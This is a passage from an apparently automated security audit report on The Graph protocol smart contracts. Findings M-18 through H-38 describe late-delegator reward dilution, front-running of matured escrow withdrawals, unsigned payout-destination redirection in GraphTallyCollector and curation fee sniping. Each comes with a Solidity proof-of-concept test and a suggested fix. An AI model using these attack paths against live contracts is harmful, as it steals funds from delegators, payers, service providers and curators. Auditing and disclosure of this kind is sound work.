        DelegationPoolHarness attacked = new DelegationPoolHarness();
        attacked.delegate(honest, 1000 ether);
        attacked.delegate(attacker, 1000 ether);
        attacked.collectDelegationRewards(1000 ether);
        uint256 attackerBridged = attacked.transferDelegationToL2(attacker);
        uint256 honestAfterAttack = attacked.claimValue(honest);

        assertEq(attackerBridged, 1500 ether);
        assertGt(attackerBridged, 1000 ether);
        assertEq(honestAfterAttack, 1500 ether);
        assertEq(honestWouldReceive - honestAfterAttack, 500 ether);
    }
}

## Suggested Mitigation
Snapshot delegation shares or per-user reward debt at allocation/reward accrual time. Apply a userRewardPerTokenPaid/rewardDebt style index so only delegators present during the rewarded period receive that period's rewards, and make transferDelegationToL2 claim only rewards accrued after the user's last checkpoint.
```

### M-18 / `RLFXAUvWIHTZ_fnu6BpJ1`
- Finding title: Delegator reward split uses live delegation pool state at collection time instead of accrual-time snapshots
- Report lines: 2629-2672
```md
## [M-18]. Delegator reward split uses live delegation pool state at collection time instead of accrual-time snapshots

## id: RLFXAUvWIHTZ_fnu6BpJ1

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
AllocationManager._distributeIndexingRewards

## Finding Status: Valid
### Finding Status Justification: This is the same root cause as the first finding and is directly supported by the code. _distributeIndexingRewards() computes tokensDelegationRewards from the live delegation pool at the time rewards are collected, not from a recorded delegation set during reward accrual. The code adds the entire delegator reward cut to the current pool and does not show any per-allocation snapshot or per-delegator reward debt. A late delegator can therefore dilute existing delegators by entering before collect(IndexingRewards). The code is in an in-scope production contract. No complete safeguard is visible, and no documentation in the prompt states that late entrants intentionally receive historical rewards. The path is currently executable through normal protocol functions and does not require privileged compromise, victim misuse, or hypothetical future changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Indexing rewards accrue to an allocation over time, but the delegator share is calculated and deposited using the live delegation pool at collection time. There is no allocation-level or delegator-level snapshot tying rewards to the delegation set that existed while the rewards accrued.

Vulnerable snippet:
`IHorizonStakingTypes.DelegationPool memory pool = _graphStaking().getDelegationPool(_allocation.indexer, address(this)); tokensDelegationRewards = pool.shares > 0 ? _rewardsCollected.mulPPM(delegatorCut) : 0; if (tokensDelegationRewards > 0) { _graphToken().approve(address(_graphStaking()), tokensDelegationRewards); _graphStaking().addToDelegationPool(_allocation.indexer, address(this), tokensDelegationRewards); }`

A delegator who enters immediately before `collect(IndexingRewards)` can share in rewards that accrued before they supplied capital.

## Impact
Late delegators can dilute long-term delegators by joining just before a large reward collection and receiving a pro-rata claim on historical rewards. The value is transferred from existing delegators to short-term entrants and encourages timing games around reward collection.

## Proof of Concept
1. Existing delegators back an indexer while an allocation accrues indexing rewards.
2. Before the indexer/operator calls `collect(IndexingRewards)`, an attacker delegates a large amount to the same indexer.
3. `_distributeIndexingRewards` reads the live pool after the attacker has joined.
4. The delegator reward cut is added to the current delegation pool, not to an accrual-time snapshot.
5. The attacker exits after any applicable thawing period with a share of rewards accrued before their delegation.

## Proof of Code
pragma solidity 0.8.33; contract MiniTest { function assertGt(uint256 a,uint256 b) internal pure { require(a>b,'not gt'); } } contract Pool { uint256 public shares; uint256 public rewardPerShare; mapping(address=>uint256) public bal; mapping(address=>uint256) public paid; function delegate(address user,uint256 amount) external { bal[user]+=amount; shares+=amount; paid[user]=bal[user]*rewardPerShare/1e18; } function addRewards(uint256 amount) external { require(shares>0,'no shares'); rewardPerShare += amount*1e18/shares; } function claimable(address user) external view returns (uint256) { return bal[user]*rewardPerShare/1e18 - paid[user]; } } contract RewardRepro { Pool public pool; uint256 public constant PPM = 1000000; uint256 public delegatorCut = 500000; constructor(Pool p){ pool=p; } function collectIndexingRewards(uint256 rewardsCollected) external { if (pool.shares() > 0) pool.addRewards(rewardsCollected * delegatorCut / PPM); } } contract LateJoinerPoC is MiniTest { function testLateJoinerCapturesHistoricalRewards() public { Pool pool = new Pool(); RewardRepro svc = new RewardRepro(pool); address honest=address(0x1); address late=address(0x2); pool.delegate(honest,100 ether); uint256 rewardsAccruedBeforeLateJoin = 1000 ether; pool.delegate(late,900 ether); svc.collectIndexingRewards(rewardsAccruedBeforeLateJoin); assertGt(pool.claimable(late),0); } }

## Suggested Mitigation
Snapshot delegation shares or a per-user reward index at the time rewards accrue, not at collection. Alternatively distribute indexing rewards through a reward-debt/user-index mechanism in HorizonStaking so newly delegated stake cannot claim rewards accrued before delegation.
```

### H-19 / `pVM1_spOMfdp34-4q1AeQ`
- Finding title: Late delegators can sandwich reward collection and bridge historical delegation rewards from L1Staking
- Report lines: 2673-2783
```md
## [H-19]. Late delegators can sandwich reward collection and bridge historical delegation rewards from L1Staking

## id: pVM1_spOMfdp34-4q1AeQ

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
L1Staking.collect

## Finding Status: Valid
### Finding Status Justification: The described sandwich path is supported by the provided code. A delegator can call delegate through the StakingExtension fallback and receive immediately active shares. collect() or reward-distributing closeAllocation() then adds delegationRewards to the current pool.tokens. If the indexer has previously transferred stake to L2, _transferDelegationToL2 allows the delegator to convert shares to tokensToSend and bridge them without the normal undelegation lock. The guards require nonzero L2 beneficiary, nonzero shares, no locked undelegation, and indexerTransferredToL2 being set, but none prevent late-share participation in historical rewards. The issue is in current in-scope production code and is permissionless.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation rewards are assigned to the current delegation pool balance at collection/close time, not to delegators that supplied capital during the allocation or query-fee accrual period. A late delegator can buy shares immediately before a large collect() or reward-distributing closeAllocation(), then exit through transferDelegationToL2() if the indexer has partially transferred stake to L2. The vulnerable flow is: _delegate() mints shares from the pre-reward pool price: `uint256 shares = (pool.tokens == 0) ? delegatedTokens : delegatedTokens.mul(pool.shares).div(pool.tokens);`; collect() later adds historical rewards to the whole current pool: `pool.tokens = pool.tokens.add(delegationRewards);`; transferDelegationToL2() lets the late delegator immediately convert all shares into the now reward-inflated pool tokens: `uint256 tokensToSend = delegation.shares.mul(pool.tokens).div(pool.shares); ... delegation.shares = 0;`. There is no userRewardPerTokenPaid/rewardDebt, allocation-start snapshot, minimum holding period, or exclusion of same-block/late shares from historical rewards.

## Impact
Existing delegators can lose a pro-rata share of large query-fee or indexing reward distributions to a late entrant. If a high-value settlement or reward distribution exceeds $1M, the attacker can extract significant GRT-denominated rewards from the staking contract and bridge the captured value to its L2 beneficiary.

## Proof of Concept
1. An indexer has an active L1 delegation pool and has already called transferStakeToL2() for a partial stake amount, so indexerTransferredToL2[indexer] is nonzero while the indexer still has L1 stake and accepts delegation. 2. A large collect() or closeAllocation() that will add delegationRewards to the pool is visible in the mempool. 3. The attacker front-runs by delegating a large amount to the indexer, receiving shares priced before the pending rewards are added. 4. The collect()/closeAllocation() executes and adds historical rewards to pool.tokens for all current shares, including the attacker’s just-minted shares. 5. The attacker back-runs transferDelegationToL2(), which burns the attacker’s shares and sends `shares * pool.tokens / pool.shares` to L2, including the captured historical rewards. 6. Incumbent delegators’ claimable value is reduced by the attacker’s extracted reward share.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract L1StakingRewardHarness {
    uint256 constant MAX_PPM = 1_000_000;

    struct Delegation { uint256 shares; }
    struct Pool { uint256 tokens; uint256 shares; mapping(address => Delegation) delegators; }

    Pool internal pool;
    uint256 public queryFeeCut;
    mapping(address => uint256) public bridged;

    function seed(address incumbent, uint256 tokens, uint256 shares) external {
        pool.tokens = tokens;
        pool.shares = shares;
        pool.delegators[incumbent].shares = shares;
    }

    function delegate(address delegator, uint256 tokens) external returns (uint256 shares) {
        shares = pool.tokens == 0 ? tokens : tokens * pool.shares / pool.tokens;
        require(shares > 0, "!shares");
        pool.tokens += tokens;
        pool.shares += shares;
        pool.delegators[delegator].shares += shares;
    }

    function collect(uint256 queryRebates) external {
        uint256 indexerCut = queryFeeCut * queryRebates / MAX_PPM;
        uint256 delegationRewards = queryRebates - indexerCut;
        if (pool.tokens > 0 && queryFeeCut < MAX_PPM) {
            pool.tokens += delegationRewards;
        }
    }

    function transferDelegationToL2(address delegator) external returns (uint256 tokensToSend) {
        uint256 shares = pool.delegators[delegator].shares;
        require(shares != 0, "delegation == 0");
        tokensToSend = shares * pool.tokens / pool.shares;
        pool.tokens -= tokensToSend;
        pool.shares -= shares;
        pool.delegators[delegator].shares = 0;
        bridged[delegator] += tokensToSend;
    }

    function claimable(address delegator) external view returns (uint256) {
        return pool.delegators[delegator].shares * pool.tokens / pool.shares;
    }
}

contract L1StakingLateJoinerTest is Test {
    function testLateJoinerSandwichesCollectAndStealsHistoricalRewards() public {
        address incumbent = address(0xA11CE);
        address attacker = address(0xB0B);
        L1StakingRewardHarness staking = new L1StakingRewardHarness();

        staking.seed(incumbent, 100 ether, 100 ether);
        uint256 pendingRewards = 1000 ether;
        uint256 incumbentWouldReceiveWithoutAttack = 1100 ether;

        staking.delegate(attacker, 900 ether);
        staking.collect(pendingRewards);
        uint256 attackerBridged = staking.transferDelegationToL2(attacker);

        uint256 attackerProfit = attackerBridged - 900 ether;
        uint256 incumbentAfterAttack = staking.claimable(incumbent);
        uint256 incumbentLoss = incumbentWouldReceiveWithoutAttack - incumbentAfterAttack;

        assertEq(attackerProfit, 900 ether);
        assertEq(incumbentAfterAttack, 200 ether);
        assertEq(incumbentLoss, 900 ether);
        assertGt(attackerProfit, 0);
    }
}


## Suggested Mitigation
Track rewards with a per-delegator reward index/rewardDebt or snapshot eligible pool shares at allocation/reward accrual time, then distribute only to shares that were present for the earning period. Additionally, prevent newly delegated shares from transferDelegationToL2() until after a minimum holding or reward-settlement epoch, or exclude same-epoch deposits from already-accrued rewards.
```

### H-22 / `fOOcoBnp5dXZARRW7F0mX`
- Finding title: Collector can front-run matured PaymentsEscrow withdrawals and drain thawed escrow funds
- Report lines: 2951-3058
```md
## [H-22]. Collector can front-run matured PaymentsEscrow withdrawals and drain thawed escrow funds

## id: fOOcoBnp5dXZARRW7F0mX

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
FrontrunMev

## Location
PaymentsEscrow.collect

## Finding Status: Valid
### Finding Status Justification: The reported code path exists in the in-scope production contract PaymentsEscrow. thaw() records tokensThawing and thawEndTimestamp while leaving account.balance unchanged, and getBalance() treats tokensThawing as unavailable. withdraw() later lets the payer recover the thawed amount only after thawEndTimestamp < block.timestamp. However, collect() is callable by the tuple collector as msg.sender and checks only account.balance >= tokens, then subtracts tokens from balance and merely caps tokensThawing afterward. It does not enforce account.balance - tokensThawing, does not check thaw maturity, and does not block collection during or after thaw. Therefore a collector for the payer/collector/receiver tuple can order collect() before the payer's matured withdraw() and consume the same escrowed balance the payer expected to withdraw. The pause check, balance consistency check around GraphPayments, and post-collection thaw cap do not prevent this exact path. No provided documentation explicitly accepts collector capture of thawed funds as intentional. The finding is in an in-scope file and asset, does not depend on a future integration, and does not require admin/governance compromise or mere user misuse; it arises from inconsistent escrow accounting in current code.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`thaw()` appears to reserve `tokensThawing` for payer withdrawal after `WITHDRAW_ESCROW_THAWING_PERIOD`, and `getBalance()` reports thawing funds as unavailable. However, `collect()` does not use the same available-balance calculation and only checks raw `account.balance`, so the collector can collect the thawed amount even after the thaw has matured, as long as their transaction is ordered before the payer's `withdraw()`. Vulnerable snippet: `getBalance(): return account.balance > account.tokensThawing ? account.balance - account.tokensThawing : 0;` but `collect(): require(account.balance >= tokens, ...); account.balance -= tokens; if (account.tokensThawing > account.balance) { account.tokensThawing = account.balance; ... }`. This lets a tuple collector bypass the revocation/withdrawal maturity gate and capture funds that off-chain systems and payers would consider no longer collectible.

## Impact
A named collector can steal all thawed escrow funds from a payer tuple by front-running the payer's matured withdrawal. If high-value payers escrow more than $1M of GRT to a collector/receiver tuple, the bug can cause significant user funds to be lost directly from the in-scope PaymentsEscrow contract.

## Proof of Concept
1. Payer deposits 1,000,000 GRT into `escrowAccounts[payer][collector][receiver]`. 2. Payer calls `thaw(collector, receiver, amount)`, making `getBalance(payer, collector, receiver)` return 0 for the thawing amount. 3. After `WITHDRAW_ESCROW_THAWING_PERIOD` elapses, the payer submits `withdraw(collector, receiver)`. 4. The collector observes the withdrawal and submits `collect(..., payer, receiver, amount, ..., receiverDestination)` with higher priority. 5. Because `collect()` checks `account.balance` instead of `account.balance - account.tokensThawing`, it succeeds, transfers the thawed GRT through GraphPayments, clears the thaw state, and the payer's withdrawal can no longer recover the funds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "../contracts/payments/PaymentsEscrow.sol";
import { IGraphPayments } from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";

contract MockController {
    bool public paused;
    mapping(bytes32 => address) public proxies;
    function set(bytes memory name, address a) external { proxies[keccak256(name)] = a; }
    function getContractProxy(bytes32 id) external view returns (address) { return proxies[id]; }
}

contract MockGraphToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { uint256 allowed = allowance[from][msg.sender]; if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract MockGraphPayments {
    MockGraphToken public token;
    constructor(MockGraphToken t) { token = t; }
    function collect(IGraphPayments.PaymentTypes, address, uint256 tokens, address, uint256, address receiverDestination) external { token.transferFrom(msg.sender, receiverDestination, tokens); }
}

contract PaymentsEscrowMaturedWithdrawRacePoC is Test {
    PaymentsEscrow escrow;
    MockGraphToken token;
    MockController controller;
    MockGraphPayments payments;
    address payer = address(0xA11CE);
    address collector = address(0xB0B);
    address receiver = address(0xCAFE);
    address attackerDestination = address(0xD00D);
    uint256 amount = 1_000_000 ether;

    function setUp() public {
        token = new MockGraphToken();
        payments = new MockGraphPayments(token);
        controller = new MockController();
        controller.set("GraphToken", address(token));
        controller.set("GraphPayments", address(payments));
        controller.set("PaymentsEscrow", address(0x1111));
        controller.set("Staking", address(0x2222));
        controller.set("EpochManager", address(0x3333));
        controller.set("RewardsManager", address(0x4444));
        controller.set("GraphTokenGateway", address(0x5555));
        controller.set("GraphProxyAdmin", address(0x6666));
        controller.set("Curation", address(0x7777));
        escrow = new PaymentsEscrow(address(controller), 7 days);
        escrow.initialize();
        token.mint(payer, amount);
        vm.startPrank(payer);
        token.approve(address(escrow), amount);
        escrow.deposit(collector, receiver, amount);
        escrow.thaw(collector, receiver, amount);
        assertEq(escrow.getBalance(payer, collector, receiver), 0);
        vm.stopPrank();
    }

    function testCollectorFrontRunsMaturedWithdrawal() public {
        vm.warp(block.timestamp + 7 days + 1);
        vm.prank(collector);
        escrow.collect(IGraphPayments.PaymentTypes(0), payer, receiver, amount, address(0), 0, attackerDestination);
        assertEq(token.balanceOf(attackerDestination), amount);
        assertEq(token.balanceOf(payer), 0);
        assertEq(escrow.getBalance(payer, collector, receiver), 0);
    }
}


## Suggested Mitigation
Make `collect()` enforce the same available-balance semantics as `getBalance()` by checking only `account.balance - account.tokensThawing`, or explicitly reject collection from a tuple once its thaw has matured. For example: `uint256 collectible = account.balance > account.tokensThawing ? account.balance - account.tokensThawing : 0; require(collectible >= tokens, PaymentsEscrowInsufficientBalance(collectible, tokens));` before decrementing `account.balance`.
```

### H-31 / `B1QFkkzj9DYXaowCh7Vf_`
- Finding title: Unsigned receiverDestination lets the data service redirect GraphTallyCollector payouts
- Report lines: 3699-3771
```md
## [H-31]. Unsigned receiverDestination lets the data service redirect GraphTallyCollector payouts

## id: B1QFkkzj9DYXaowCh7Vf_

## Derived From Pattern/Invariant
AccessControlOrAuthByPass: payout destination is not authorized by the signed RAV

## Exploit Type
AuthByPass

## Location
GraphTallyCollector.collect

## Finding Status: Valid
### Finding Status Justification: The vulnerable path exists in the in-scope GraphTallyCollector.collect/_collect flow. collect decodes caller-supplied data as (SignedRAV, uint256 dataServiceCut, address receiverDestination), verifies only that signedRAV.rav.dataService == msg.sender and that the recovered signer is authorized by the payer, then forwards receiverDestination to PaymentsEscrow.collect. _encodeRAV signs collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata only; receiverDestination is not included. The active-provision check limits collection to a dataService with provider tokens available, but it does not authenticate the payout destination. The comments even describe receiverDestination as the address where the receiver payment should be sent, so the caller-controlled value is payment-affecting. No complete safeguard requires receiverDestination == serviceProvider or separate provider authorization. The file is explicitly in scope and the behavior is not documented as an accepted risk. Exploitation requires the RAV dataService to submit a valid RAV, but that is a normal protocol participant path, not governance/admin abuse, leaked keys, or pure victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
GraphTallyCollector verifies that the caller is the RAV dataService and that the RAV signer is authorized for the payer, but the receiver payout destination is decoded from caller-supplied calldata and is not part of the signed ReceiptAggregateVoucher. Vulnerable snippet: `(SignedRAV memory signedRAV, uint256 dataServiceCut, address receiverDestination) = abi.decode(_data, (SignedRAV, uint256, address)); ... address receiver = signedRAV.rav.serviceProvider; ... _graphPaymentsEscrow().collect(_paymentType, signedRAV.rav.payer, receiver, tokensToCollect, dataService, dataServiceCut, receiverDestination);`. The RAV binds `serviceProvider` but not `receiverDestination`, so a malicious dataService named in a valid RAV can consume the serviceProvider tuple in `tokensCollected` while instructing escrow to pay the receiver share to an arbitrary address.

## Impact
A malicious dataService can steal service provider payments directly from PaymentsEscrow. If high-value RAVs are settled through this collector, the blast radius is the full collectible receiver portion of those escrowed GRT payments.

## Proof of Concept
1. A payer authorizes a signer and the signer issues a valid RAV naming an honest serviceProvider and a dataService. 2. The dataService calls `collect` with the valid signed RAV but sets `receiverDestination` to the attacker address. 3. `_collect` accepts the RAV because `signedRAV.rav.dataService == msg.sender` and the signer is authorized. 4. `tokensCollected[dataService][collectionId][serviceProvider][payer]` is advanced for the honest serviceProvider. 5. PaymentsEscrow receives the attacker-chosen destination and pays the receiver leg there, consuming the serviceProvider entitlement.

## Proof of Code
pragma solidity ^0.8.20;
enum PaymentTypes { Escrow, QueryFee }
contract MockEscrow {
    mapping(address => uint256) public receiverPaid;
    function collect(PaymentTypes, address, address, uint256 amount, address, uint256 cut, address receiverDestination) external {
        uint256 receiverAmount = amount - ((amount * cut) / 1_000_000);
        receiverPaid[receiverDestination] += receiverAmount;
    }
}
contract ReceiverDestinationPoC {
    struct RAV { bytes32 collectionId; address payer; address serviceProvider; address dataService; uint64 timestampNs; uint128 valueAggregate; bytes metadata; }
    struct SignedRAV { RAV rav; bytes signature; }
    mapping(address => mapping(bytes32 => mapping(address => mapping(address => uint256)))) public tokensCollected;
    MockEscrow escrow = new MockEscrow();
    address payer = address(0x1);
    address serviceProvider = address(0x2);
    address attacker = address(0x3);
    function test_receiverDestinationCanRedirectPayout() public {
        RAV memory rav = RAV(bytes32(0), payer, serviceProvider, address(this), 1, 100 ether, new bytes(0));
        SignedRAV memory signed = SignedRAV(rav, new bytes(0));
        bytes memory data = abi.encode(signed, uint256(0), attacker);
        this.collect(PaymentTypes.Escrow, data);
        assertEq(escrow.receiverPaid(attacker), 100 ether);
        assertEq(escrow.receiverPaid(serviceProvider), 0);
        assertEq(tokensCollected[address(this)][bytes32(0)][serviceProvider][payer], 100 ether);
    }
    function collect(PaymentTypes paymentType, bytes calldata data) external returns (uint256) { return _collect(paymentType, data, 0); }
    function _collect(PaymentTypes paymentType, bytes calldata data, uint256) private returns (uint256) {
        (SignedRAV memory signed, uint256 cut, address receiverDestination) = abi.decode(data, (SignedRAV, uint256, address));
        require(signed.rav.dataService == msg.sender);
        uint256 already = tokensCollected[signed.rav.dataService][signed.rav.collectionId][signed.rav.serviceProvider][signed.rav.payer];
        require(signed.rav.valueAggregate > already);
        uint256 amount = signed.rav.valueAggregate - already;
        tokensCollected[signed.rav.dataService][signed.rav.collectionId][signed.rav.serviceProvider][signed.rav.payer] += amount;
        escrow.collect(paymentType, signed.rav.payer, signed.rav.serviceProvider, amount, signed.rav.dataService, cut, receiverDestination);
        return amount;
    }
    function assertEq(uint256 a, uint256 b) internal pure { require(a == b); }
}

## Suggested Mitigation
Bind the receiver payout destination in the signed RAV, or require `receiverDestination == signedRAV.rav.serviceProvider` unless the serviceProvider has separately signed an authorization for that destination. Emit and store the signed destination so the escrow payout target cannot be chosen only by the collecting dataService.
```

### M-37 / `YLx4Szz9XO4l7crTSUkEG`
- Finding title: Late delegators can front-run fee collection in L1Staking.collect to capture historical delegation rewards
- Report lines: 4123-4216
```md
## [M-37]. Late delegators can front-run fee collection in L1Staking.collect to capture historical delegation rewards

## id: YLx4Szz9XO4l7crTSUkEG

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
L1Staking.collect / _collectDelegationQueryRewards

## Finding Status: Valid
### Finding Status Justification: The collect path exists in in-scope L1Staking. collect() pulls query fees, computes queryRebates, then calls _collectDelegationQueryRewards, which reads the current pool.queryFeeCut and adds delegationRewards to pool.tokens. The delegation entry path mints shares immediately using delegatedTokens * pool.shares / pool.tokens. The code provided does not snapshot delegation at fee accrual or allocation creation, nor does it update per-user reward debt before minting shares. The attack uses public delegation and a public/observable collection event, not privileged control or victim misuse. No complete guard blocks the exact late-join reward capture.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation query-fee rewards are credited to the current delegation pool at collection time, while new delegation shares can be minted immediately before that collection. The reward calculation has no per-user reward debt, no allocation-time delegation snapshot, and no minimum holding period, so a late delegator can buy a large share of the pool immediately before a large collect() and receive rewards generated before they delegated. Vulnerable flow: _delegate mints shares from the live pool ratio with `shares = delegatedTokens * pool.shares / pool.tokens`, then collect() calls `_collectDelegationQueryRewards(alloc.indexer, queryRebates)`, which simply does `pool.tokens = pool.tokens.add(delegationRewards)`. Existing delegators are diluted because the new shares participate in the historical reward top-up.

## Impact
Existing delegators lose a pro-rata portion of query-fee rewards held by the staking contract. A permissionless attacker can extract unearned GRT rewards from the delegation pool by temporarily supplying a large delegation before a known or mempool-visible collect transaction, then undelegating after the reward is credited.

## Proof of Concept
1. An honest delegator has 100 GRT delegated to an indexer. 2. A large query-fee collection for that indexer's allocation is about to be submitted, producing 100 GRT of delegation rewards. 3. The attacker front-runs collect() and delegates 900 GRT to the same indexer, receiving 90% of current shares. 4. collect() credits the full 100 GRT reward to pool.tokens for current shares, not the shares that existed during fee accrual. 5. The attacker now owns 990 GRT redeemable value, capturing 90 GRT of rewards that should have gone to the prior delegator. 6. The attacker undelegates and withdraws after the unbonding period, or migrates through transferDelegationToL2 if available.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract DelegationPoolHarness {
    uint256 constant MAX_PPM = 1_000_000;
    struct Delegation { uint256 shares; }
    struct Pool { uint32 queryFeeCut; uint256 tokens; uint256 shares; mapping(address => Delegation) delegators; }
    Pool internal pool;

    constructor() { pool.queryFeeCut = 0; }

    function seed(address user, uint256 amount) external {
        require(pool.tokens == 0);
        pool.tokens = amount;
        pool.shares = amount;
        pool.delegators[user].shares = amount;
    }

    function delegate(address user, uint256 amount) external {
        uint256 shares = pool.tokens == 0 ? amount : amount * pool.shares / pool.tokens;
        require(shares > 0);
        pool.tokens += amount;
        pool.shares += shares;
        pool.delegators[user].shares += shares;
    }

    function collectDelegationRewards(uint256 tokens) external {
        if (pool.tokens > 0 && pool.queryFeeCut < MAX_PPM) {
            uint256 indexerCut = uint256(pool.queryFeeCut) * tokens / MAX_PPM;
            uint256 delegationRewards = tokens - indexerCut;
            pool.tokens += delegationRewards;
        }
    }

    function redeemable(address user) external view returns (uint256) {
        return pool.delegators[user].shares * pool.tokens / pool.shares;
    }
}

contract LateDelegatorFreeRiderTest is Test {
    function testLateDelegatorCapturesHistoricalRewards() external {
        address honest = address(0xA11CE);
        address attacker = address(0xB0B);
        DelegationPoolHarness pool = new DelegationPoolHarness();

        pool.seed(honest, 100 ether);
        pool.delegate(attacker, 900 ether);
        pool.collectDelegationRewards(100 ether);

        uint256 attackerValue = pool.redeemable(attacker);
        uint256 honestValue = pool.redeemable(honest);
        uint256 attackerProfit = attackerValue - 900 ether;
        uint256 honestLoss = 200 ether - honestValue;

        assertEq(attackerProfit, 90 ether);
        assertEq(honestLoss, 90 ether);
        assertGt(attackerProfit, 0);
    }
}

## Suggested Mitigation
Snapshot delegation pool shares when an allocation is created or when fees accrue, and distribute delegation rewards using that snapshot. Alternatively, use a standard rewardPerShare/userRewardPerTokenPaid accounting model that updates users before delegation changes, or enforce a cutoff/minimum holding period so shares minted after fee accrual cannot claim those historical rewards.
```

### H-38 / `pOfr5KMT_5lFxRkf9mVXT`
- Finding title: Fee sniping in L2Curation.collect lets same-transaction minters capture already-accrued query fees
- Report lines: 4217-4251
```md
## [H-38]. Fee sniping in L2Curation.collect lets same-transaction minters capture already-accrued query fees

## id: pOfr5KMT_5lFxRkf9mVXT

## Derived From Pattern/Invariant
MaturityorGatingByPass / FrontrunMev

## Exploit Type
FrontrunMev

## Location
L2Curation.mint/collect/burn

## Finding Status: Valid
### Finding Status Justification: The code supports the claimed fee-sniping path. L2Curation.collect increases pools[id].tokens without increasing total GCS supply or recording a pre-collect eligibility snapshot. A permissionless user can mint GCS before collection using pre-fee pricing, and burn after collection using signalToTokens, which computes curationPool.tokens * signalIn / totalSignal against the enlarged reserve. There is no cooldown, block/epoch maturity, or time-weighted accounting in mint, collect, or burn. collect is restricted to subgraphService or staking, but that is not a complete safeguard against sandwiching a legitimate authorized collect, and exploitation does not require privileged-role abuse by the attacker. The issue affects in-scope production L2Curation and is not expressly documented as an accepted design risk. It is currently exploitable whenever a collect is observable or otherwise predictable enough to be ordered around.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L2Curation adds collected fees directly to a pool's reserves without minting new GCS or enforcing any holding-period/snapshot eligibility. A curator can mint immediately before a visible authorized collect(), receive shares priced only against the pre-fee reserve, then burn immediately after collect() to withdraw a pro-rata share of fees that were economically accrued before the attacker curated. Vulnerable flow: collect() only does `curationPool.tokens = curationPool.tokens.add(_tokens);` and emits Collected; mint() allows immediate share creation before collect; burn() allows immediate redemption after collect. There is no epoch snapshot, cooldown, or time-weighted fee eligibility binding fees to the GCS holders that existed when the fees were earned.

## Impact
Existing curators can lose most or all of a large fee distribution to a permissionless MEV searcher with temporary capital. If large query-fee collections are predictable or visible, the attacker can repeatedly extract GRT from L2Curation reserves, causing significant user funds to be stolen from protocol contracts.

## Proof of Concept
1. A pool has existing curators and pending query fees about to be booked through collect(). 2. A searcher observes the authorized collect(_subgraphDeploymentID, feeAmount) transaction. 3. The searcher front-runs it with mint(), paying only the normal curation tax and receiving GCS based on the pre-fee pool.tokens. 4. collect() executes and increases pool.tokens without increasing total GCS supply. 5. The searcher back-runs with burn() and withdraws their deposit plus a pro-rata share of the just-collected fees. 6. Existing curators receive materially less fee value despite having provided the pre-existing signal.

## Proof of Code
pragma solidity ^0.8.20; contract L2CurationHarness { uint256 constant MAX_PPM=1000000; uint256 public curationTaxPercentage=10000; uint256 public poolTokens; uint256 public totalSignal; mapping(address=>uint256) public signalBal; mapping(address=>uint256) public grtBal; function seed(address curator,uint256 tokens,uint256 signal) external { poolTokens=tokens; totalSignal=signal; signalBal[curator]=signal; } function dealGRT(address a,uint256 amount) external { grtBal[a]=amount; } function quoteMint(uint256 tokensIn) public view returns(uint256 signal,uint256 tax){ uint256 net=(MAX_PPM-curationTaxPercentage)*tokensIn/MAX_PPM; tax=tokensIn-net; signal=totalSignal*net/poolTokens; } function mint(uint256 tokensIn) external returns(uint256 signal,uint256 tax){ (signal,tax)=quoteMint(tokensIn); uint256 net=tokensIn-tax; grtBal[msg.sender]-=tokensIn; poolTokens+=net; totalSignal+=signal; signalBal[msg.sender]+=signal; } function collect(uint256 tokens) external { poolTokens+=tokens; } function redeemable(address a) external view returns(uint256){ return poolTokens*signalBal[a]/totalSignal; } function burn(uint256 signalIn) external returns(uint256 tokensOut){ tokensOut=poolTokens*signalIn/totalSignal; signalBal[msg.sender]-=signalIn; totalSignal-=signalIn; poolTokens-=tokensOut; grtBal[msg.sender]+=tokensOut; } } contract L2CurationFeeSnipingTest { function assertGt(uint256 a,uint256 b) internal pure { require(a>b); } function testMintBeforeCollectCapturesPriorFees() public { address existing=address(0xBEEF); L2CurationHarness c=new L2CurationHarness(); c.seed(existing,1000000 ether,1000000 ether); uint256 attackerStart=9000000 ether; c.dealGRT(address(this),attackerStart); (uint256 attackerSignal,)=c.mint(attackerStart); c.collect(2000000 ether); c.burn(attackerSignal); assertGt(c.grtBal(address(this)),attackerStart); assertGt(3000000 ether,c.redeemable(existing)); } }

## Suggested Mitigation
Snapshot fee eligibility before reserve-increasing collect() calls, or account collected fees through a separate accumulator/index that only pre-existing signal participates in. Alternatively enforce a minimum holding period/epoch maturity before newly minted GCS can claim collected fees, and apply the same eligibility check in burn().
```

### H-39 / `h_vAbk2vdvEPQbccEZdHw`
- Finding title: Zero-minimum L2GNS.publishNewVersion can burn curator backing and leave all name signal unredeemable
- Report lines: 4252-4339
```md
## [H-39]. Zero-minimum L2GNS.publishNewVersion can burn curator backing and leave all name signal unredeemable

## id: h_vAbk2vdvEPQbccEZdHw

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
RoundingError

## Location
L2GNS.publishNewVersion

## Finding Status: Valid
